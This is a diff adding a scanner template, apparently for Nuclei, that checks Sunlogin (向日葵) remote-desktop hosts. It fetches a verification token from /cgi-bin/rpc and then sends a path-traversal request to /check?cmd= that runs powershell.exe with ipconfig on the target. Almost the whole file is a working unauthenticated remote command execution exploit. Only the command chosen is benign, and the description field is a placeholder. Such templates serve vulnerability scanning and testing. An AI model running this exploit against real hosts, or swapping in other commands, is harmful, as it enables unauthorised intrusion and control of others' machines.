@@ -1,0 +1,38 @@
+id: check
+info:
+  name: 向日葵 check
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="Verification failure"
+http:
+  - raw:
+      - |
+        GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+  
+      - |
+        GET /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Cookie: CID={{cid}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "DNS"
+    extractors:
+      - type: json # type of the extractor
+        part: body
+        name: cid
+        internal: true # Required for using dynamic variables
+        json:
+          - '.verify_string'  # JQ like syntax for extraction
